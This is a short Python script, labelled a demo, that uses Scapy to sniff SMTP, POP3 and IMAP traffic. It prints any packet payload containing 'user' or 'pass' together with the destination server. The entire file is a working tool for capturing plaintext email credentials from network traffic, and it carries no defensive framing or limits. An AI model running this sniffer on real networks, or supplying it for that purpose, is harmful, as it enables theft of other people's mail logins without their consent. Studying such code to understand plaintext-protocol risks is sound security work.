from scapy.all import *
from scapy.layers.inet import TCP

"""
demo:sniff one packet and print
"""


# callback function with one parameter packet
def packet_callback(packet):
    if packet[TCP].payload:
        mail_packet = str(packet[TCP].payload)
        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            print("Server %s"%packet[IP].dst)
            print(mail_packet)


if __name__ == '__main__':
    sniff(filter="tcp port 25 or tcp port 110 or tcp port 143",store=0,prn=packet_callback)